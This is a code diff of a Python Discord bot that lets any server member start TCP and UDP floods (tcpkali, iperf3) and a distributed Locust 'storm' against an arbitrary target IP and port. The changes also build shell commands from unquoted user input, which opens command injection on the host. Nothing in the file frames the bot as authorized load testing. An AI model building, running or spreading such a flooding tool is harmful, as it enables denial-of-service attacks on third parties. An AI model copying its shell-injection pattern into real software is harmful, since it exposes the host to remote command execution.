@@ -1,8 +1,8 @@
-# bot.py
 import os
 import asyncio
-import subprocess
+import shlex
 from typing import Literal
+import subprocess
 
 import discord
 from discord import app_commands
@@ -10,13 +10,20 @@ from discord.ext import commands
 
 # ─── Configuration ──────────────────────────────────────────────────────────────
 BOT_TOKEN       = os.getenv("DISCORD_TOKEN")
-ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = no restriction
-# Default parameters for tools:
-DEFAULT_TCP_CONNS   = 1000
-DEFAULT_TCP_RATE    = 30000
-DEFAULT_TCP_DUR     = 5      # seconds
-DEFAULT_UDP_BW      = "1G"   # iperf3 bandwidth
-DEFAULT_UDP_DUR     = 5      # seconds
+ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = open to all
+
+# Defaults for quick floods
+DEFAULT_TCP_CONNS  = 1000
+DEFAULT_TCP_RATE   = 30000
+DEFAULT_TCP_DUR    = 5     # seconds
+DEFAULT_UDP_BW     = "1G"
+DEFAULT_UDP_DUR    = 5     # seconds
+
+# Defaults for distributed storm
+DEFAULT_USERS      = 200
+DEFAULT_SPAWN_RATE = 20
+DEFAULT_RUN_TIME   = "2m"
+DEFAULT_WORKERS    = 4
 # ────────────────────────────────────────────────────────────────────────────────
 
 class FloodBot(commands.Bot):
@@ -26,8 +33,8 @@ class FloodBot(commands.Bot):
         self.tree = app_commands.CommandTree(self)
 
     async def setup_hook(self):
-        # Register the commands with Discord
         self.tree.add_command(flood)
+        self.tree.add_command(storm)
         await self.tree.sync()
 
 bot = FloodBot()
@@ -37,28 +44,29 @@ def has_flood_role(interaction: discord.Interaction) -> bool:
         return True
     return any(role.id == ALLOWED_ROLE_ID for role in interaction.user.roles)
 
-async def run_subprocess(cmd: list[str], timeout: float) -> tuple[int,str]:
-    """Run a subprocess for `timeout` seconds, then terminate."""
-    proc = await asyncio.create_subprocess_exec(
-        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+async def run_subprocess(cmd: str, timeout: float) -> tuple[int, str]:
+    proc = await asyncio.create_subprocess_shell(
+        cmd,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
     )
+    await asyncio.sleep(timeout)
+    proc.terminate()
     try:
-        await asyncio.sleep(timeout)
-        proc.terminate()
         await proc.wait()
-    except Exception:
+    except:
         proc.kill()
     out, err = await proc.communicate()
     return proc.returncode, err.decode().strip()
 
-@bot.tree.command(name="flood", description="Start a TCP or UDP flood")
+@bot.tree.command(name="flood", description="Start a TCP or UDP flood (tcpkali/iperf3)")
 @app_commands.describe(
-    tool="Which tool to use: tcpkali or iperf3",
-    ip="Target IPv4 address",
-    port="Target port (for tcpkali or iperf3 client)",
-    conns="(tcpkali) number of connections to keep open",
-    rate="(tcpkali) new connections per second",
-    bw="(iperf3) bandwidth string, e.g. 100M, 1G",
+    tool="tcpkali or iperf3",
+    ip="Target IPv4",
+    port="Target port",
+    conns="(tcpkali) connections to keep open",
+    rate="(tcpkali) new connections/sec",
+    bw="(iperf3) bandwidth, e.g. 100M,1G",
     dur="Duration in seconds",
 )
 async def flood(
@@ -71,48 +79,89 @@ async def flood(
     bw: str | None = None,
     dur: int | None = None,
 ):
-    # Permission check
     if not has_flood_role(interaction):
-        await interaction.response.send_message("🚫 You lack permissions.", ephemeral=True)
-        return
+        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)
 
     await interaction.response.defer(thinking=True)
 
-    # Fill defaults
-    dur    = dur or (DEFAULT_TCP_DUR if tool == "tcpkali" else DEFAULT_UDP_DUR)
     if tool == "tcpkali":
         conns = conns or DEFAULT_TCP_CONNS
         rate  = rate  or DEFAULT_TCP_RATE
-        cmd = [
-            "tcpkali",
-            "--connections", str(conns),
-            "--connect-rate", str(rate),
-            "--duration", str(dur),
-            f"{ip}:{port}",
-        ]
-        desc = f"TCP flood → {ip}:{port}, {conns} conns @ {rate}/s for {dur}s"
-    else:  # iperf3
-        bw    = bw or DEFAULT_UDP_BW
-        cmd = [
-            "iperf3",
-            "-c", ip,
-            "-u",
-            "-b", bw,
-            "-t", str(dur),
-            "-p", str(port),
-            "-y", "C",  # CSV output to speed up exit
-        ]
-        desc = f"UDP flood → {ip}:{port}, {bw} bandwidth for {dur}s"
-
-    # Run the tool
-    exitcode, stderr = await run_subprocess(cmd, timeout=dur + 1)
-
-    if exitcode == 0:
-        content = f"✅ Completed {tool} flood:\n{desc}"
+        dur   = dur   or DEFAULT_TCP_DUR
+        cmd   = f"tcpkali --connections {conns} --connect-rate {rate} --duration {dur} {ip}:{port}"
+        desc  = f"TCP flood: {conns} conns @ {rate}/s for {dur}s → `{ip}:{port}`"
     else:
-        content = f"⚠️ `{tool}` exited {exitcode}\n```{stderr}```"
+        bw  = bw  or DEFAULT_UDP_BW
+        dur = dur or DEFAULT_UDP_DUR
+        cmd = f"iperf3 -c {ip} -u -b {bw} -t {dur} -p {port} -y C"
+        desc= f"UDP flood: {bw} for {dur}s → `{ip}:{port}`"
 
-    await interaction.followup.send(content)
+    code, stderr = await run_subprocess(cmd, timeout=(dur or 5) + 1)
+    if code == 0:
+        await interaction.followup.send(f"✅ {tool} completed: {desc}")
+    else:
+        await interaction.followup.send(f"⚠️ `{tool}` exited {code}\n```{stderr}```")
+
+@bot.tree.command(name="storm", description="Run a distributed Locust+C-Tools storm")
+@app_commands.describe(
+    ip="Target IPv4 for both TCP/UDP",
+    tcp_port="TCP port for tcpkali",
+    udp_port="UDP port for iperf3",
+    users="Total virtual users",
+    spawn_rate="Spawn rate (users/sec)",
+    run_time="Run time (e.g. 2m,30s)",
+    workers="Number of Locust worker processes",
+)
+async def storm(
+    interaction: discord.Interaction,
+    ip: str,
+    tcp_port: int,
+    udp_port: int,
+    users: int | None     = None,
+    spawn_rate: int | None= None,
+    run_time: str | None  = None,
+    workers: int | None   = None,
+):
+    if not has_flood_role(interaction):
+        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)
+
+    users      = users      or DEFAULT_USERS
+    spawn_rate = spawn_rate or DEFAULT_SPAWN_RATE
+    run_time   = run_time   or DEFAULT_RUN_TIME
+    workers    = workers    or DEFAULT_WORKERS
+
+    await interaction.response.defer(thinking=True)
+
+    # Build env prefix
+    envp = (
+        f"LOCUST_TARGET_IP={shlex.quote(ip)} "
+        f"LOCUST_TCP_PORT={tcp_port} "
+        f"LOCUST_UDP_PORT={udp_port} "
+        f"LOCUST_UDP_BW={shlex.quote(DEFAULT_UDP_BW)}"
+    )
+
+    master_cmd = (
+        f"{envp} locust -f locustfile_tools.py "
+        f"--master --expect-workers {workers} --headless "
+        f"--users {users} --spawn-rate {spawn_rate} --run-time {run_time}"
+    )
+    master = await asyncio.create_subprocess_shell(master_cmd)
+    await asyncio.sleep(5)
+
+    # Spawn workers
+    for _ in range(workers):
+        await asyncio.create_subprocess_shell(
+            f"{envp} locust -f locustfile_tools.py --worker --master-host=127.0.0.1"
+        )
+
+    code = await master.wait()
+    if code == 0:
+        await interaction.followup.send(
+            f"🔥 Storm done: {users} users @ {spawn_rate}/s for {run_time}, "
+            f"TCP→{ip}:{tcp_port}, UDP→{ip}:{udp_port}, workers={workers}"
+        )
+    else:
+        await interaction.followup.send(f"⚠️ Storm failed with exit code {code}.")
 
 if __name__ == "__main__":
     bot.run(BOT_TOKEN)
